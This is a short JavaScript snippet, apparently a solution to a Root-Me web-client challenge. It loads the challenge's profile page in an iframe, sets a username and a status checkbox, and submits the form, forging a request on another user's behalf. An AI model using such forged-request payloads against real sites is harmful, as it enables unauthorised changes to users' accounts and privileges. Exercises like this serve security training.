const ifr = document.querySelector("#principalIframe");
const insideIfr = ifr.contentDocument;
ifr.src = "http://challenge01.root-me.org/web-client/ch23/index.php?action=profile"

insideIfr.querySelector("#username").value = "test1"
insideIfr.querySelector("#status").checked = true

insideIfr.forms[0].submit()




